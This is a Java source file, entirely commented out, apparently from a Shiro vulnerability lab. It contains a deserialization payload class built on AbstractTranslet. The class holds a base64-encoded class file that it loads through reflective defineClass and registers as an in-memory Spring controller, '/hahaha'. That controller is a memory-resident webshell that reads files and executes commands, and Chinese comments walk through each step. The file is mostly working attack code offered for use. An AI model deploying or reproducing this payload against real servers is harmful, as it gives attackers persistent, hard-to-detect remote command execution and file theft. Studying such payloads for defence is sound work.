//package com.shiro.vuln.Payload;
//
//import com.sun.org.apache.xalan.internal.xsltc.DOM;
//import com.sun.org.apache.xalan.internal.xsltc.TransletException;
//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
//import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
//import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
//import org.springframework.web.bind.annotation.RequestMethod;
//
//public class ControllerShell extends AbstractTranslet {
//    static {
//        try {
//            String s1 = "yv66vgAAADQAwwoAMABmCABECwBnAGgLAGkAaggAawgAbAoAFwBtCgAXAG4KAC4AbwgAcAoALgBxCAByCgBGAHMKAEYAdAoARgB1BwB2CgAQAHcHAHgKABIAZgcAeQcAegoAFwB7BwB8CgB9AH4HAH8KAIAAgQoAFQCCCgAUAIMKABQAhAoAEgCFCACGCgASAIcKAIgAiQoAiACKCgBbAIsKAFsAjAgAjQoAFQCOCgBbAI8KABIAkAoALgCRCgBbAJIHAJMKACsAdwsAlAB1BwCVCgAuAGYHAJYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE0xzaGVsbC9TcHJpbmdTaGVsbDsBAAVpbmRleAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAJwdwEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEABnJlc3VsdAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAANyZXMBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAlwEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBADhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nOwEABXZhbHVlAQAFL1B3bnIBAARyZWFkAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARmaWxlAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAVsaW5lMgEACkV4Y2VwdGlvbnMBAARleGVjAQAEbGluZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB2NvbW1hbmQBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEACGJ1ZmZlckluAQALYnVmZmVyRXJyb3IHAJgHAJkBAAtjbG9zZVN0cmVhbQEAFihMamF2YS9pby9DbG9zZWFibGU7KVYBAAZzdHJlYW0BABNMamF2YS9pby9DbG9zZWFibGU7AQALbmV3SW5zdGFuY2UBABUoKUxzaGVsbC9TcHJpbmdTaGVsbDsBAApTb3VyY2VGaWxlAQAQU3ByaW5nU2hlbGwuamF2YQEAK0xvcmcvc3ByaW5nZnJhbWV3b3JrL3N0ZXJlb3R5cGUvQ29udHJvbGxlcjsMADEAMgcAmgwAmwBMBwCcDACdAJ4BAAABAAVyZWFkOgwAnwCgDAChAKIMAEsATAEABWV4ZWM6DABTAEwBAB9oZWxwOiByZWFkOltmaWxlXSB8IGV4ZWM6W2NtZF0KDACjAKQMAKUAMgwApgAyAQATamF2YS9pby9JT0V4Y2VwdGlvbgwApwAyAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAqACpAQAQamF2YS9sYW5nL1N0cmluZwcAqgwAqwCsAQAYamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uBwCtDACuAK8MADEAsAwAMQCxDACyAKkMALMAtAEAAQoMALUAqQcAtgwAtwC4DABTALkMALoAuwwAvAC9AQAFVVRGLTgMADEAvgwAvwC9DACzAMAMAF0AXgwAwQAyAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAwgEAEXNoZWxsL1NwcmluZ1NoZWxsAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvbGFuZy9UaHJvd2FibGUBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UBAA9wcmludFN0YWNrVHJhY2UBAAR0cmltAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL25pby9maWxlL1BhdGhzAQADZ2V0AQA7KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2ZpbGUvUGF0aDsBABNqYXZhL25pby9maWxlL0ZpbGVzAQAObmV3SW5wdXRTdHJlYW0BAEYoTGphdmEvbmlvL2ZpbGUvUGF0aDtbTGphdmEvbmlvL2ZpbGUvT3Blbk9wdGlvbjspTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAAd3YWl0Rm9yAQADKClJAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAKihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZzspVgEADmdldEVycm9yU3RyZWFtAQAcKEMpTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2Rlc3Ryb3kBABFqYXZhL2lvL0Nsb3NlYWJsZQAhAC4AMAAAAAAABgABADEAMgABADMAAAAzAAEAAQAAAAUqtwABsQAAAAIANAAAAAoAAgAAABAABAASADUAAAAMAAEAAAAFADYANwAAAAEAOAA5AAIAMwAAATsAAgAGAAAAaysSArkAAwIATi3GAFYsuQAEAQA6BBIFOgUtEga2AAeZABMtCLYACE4qLbYACToFpwAgLRIKtgAHmQATLQi2AAhOKi22AAs6BacABxIMOgUZBBkFtgANGQS2AA4ZBLYAD6cACjoEGQS2ABGxAAEACQBgAGMAEAADADQAAABKABIAAAAWAAkAGAANABkAFQAaABkAGwAiABwAKAAdADIAHgA7AB8AQQAgAEsAIgBPACQAVgAlAFsAJgBgACsAYwApAGUAKgBqAC4ANQAAAEgABwAVAEsAOgA7AAQAGQBHADwAPQAFAGUABQA+AD8ABAAAAGsANgA3AAAAAABrAEAAQQABAAAAawBCAEMAAgAJAGIARAA9AAMARQAAABgABv4AMgcAFwcARgcAFxgD+QAQQgcAEAYARwAAAA4AAQBIAAEASVsAAXMASgABAEsATAACADMAAADJAAYABQAAAEq7ABJZtwATTbsAFFm7ABVZK7YAFgO9ABe4ABgDvQAZuAAatwAbtwAcTgE6BC22AB1ZOgTGABIsGQS2AB4SH7YAHlen/+ostgAgsAAAAAMANAAAAB4ABwAAADEACAAyABEAMwApADQALAA1ADYANgBFADgANQAAADQABQAAAEoANgA3AAAAAABKAE0APQABAAgAQgBOAE8AAgApACEASwBQAAMALAAeAFEAPQAEAEUAAAAPAAL+ACwHABIHABQHABcYAFIAAAAEAAEAEAABAFMATAABADMAAAIHAAYACAAAAM27ABJZtwATTQFOAToEAToFuAAhK7YAIk4ttgAjV7sAFFm7ABVZLbYAJBIltwAmtwAcOgS7ABRZuwAVWS22ACcSJbcAJrcAHDoFAToGGQS2AB1ZOgbGABIsGQa2AB4QCrYAKFen/+kZBbYAHVk6BsYAEiwZBrYAHhAKtgAoV6f/6RkEuAApGQW4ACktxgA9LbYAKqcANjoGGQa2ACwZBLgAKRkFuAApLcYAIS22ACqnABo6BxkEuAApGQW4ACktxgAHLbYAKhkHvyy2ACCwAAQAEACAAJUAKwAQAIAAsQAAAJUAnACxAAAAsQCzALEAAAADADQAAAB2AB0AAAA8AAgAPgAKAD8ADQBAABAAQwAYAEUAHQBHADMASABJAEoATABLAFcATABmAE4AcQBPAIAAVQCFAFYAigBYAI4AWQCVAFIAlwBTAJwAVQChAFYApgBYAKoAWQCxAFUAuABWAL0AWADBAFkAxQBbAMgAXQA1AAAAUgAIAEwANABUAD0ABgCXAAUAPgBVAAYAAADNADYANwAAAAAAzQBWAD0AAQAIAMUAPABPAAIACgDDAFcAWAADAA0AwABZAFAABAAQAL0AWgBQAAUARQAAADQAB/8ATAAHBwAuBwAXBwASBwBbBwAUBwAUBwAXAAAZ+gAZVAcAK1sHAFz9ABMABwBc+QACAAoAXQBeAAEAMwAAAF4AAQACAAAADyrGAA0quQAtAQCnAARMsQABAAQACgANACsAAwA0AAAAFgAFAAAAYQAEAGMACgBmAA0AZAAOAGgANQAAAAwAAQAAAA8AXwBgAAAARQAAAAcAAk0HACsAAAkAYQBiAAEAMwAAACAAAgAAAAAACLsALlm3AC+wAAAAAQA0AAAABgABAAAAawACAGMAAAACAGQARwAAAAYAAQBlAAA=";
//            byte[] bytes1 = java.util.Base64.getDecoder().decode(s1.getBytes());
//            // 反射获取defineClass方法
//            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{String.class, byte[].class, int.class, int.class});
//            m.setAccessible(true);
//            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
//            // 执行defineClass，将上面的bytes定义为"shell.SpringShell.class"
//            m.invoke(classLoader, new Object[]{"shell.SpringShell", bytes1, 0, bytes1.length});
//            // 获取Context上下文
//            org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
//            // 定义访问 controller 的 URL 地址
//            org.springframework.web.servlet.mvc.condition.PatternsRequestCondition url = new org.springframework.web.servlet.mvc.condition.PatternsRequestCondition(new String[]{"/hahaha"});
//            // 定义访问 controller 的方法
//            RequestMethod[] a = {RequestMethod.GET, RequestMethod.POST};
//            org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition ms = new org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition(a);
//            // 在内存中注册Controller
//            org.springframework.web.servlet.mvc.method.RequestMappingInfo info = new org.springframework.web.servlet.mvc.method.RequestMappingInfo(url, ms, null, null, null, null, null);
//            org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping rs = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
//            m = (Class.forName("shell.SpringShell",true,classLoader).getDeclaredMethods())[0];
//            rs.registerMapping(info, Class.forName("shell.SpringShell",true,classLoader).newInstance(), m);
//
//
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//
//    @Override
//    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
//
//    }
//
//    @Override
//    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
//
//    }
//}
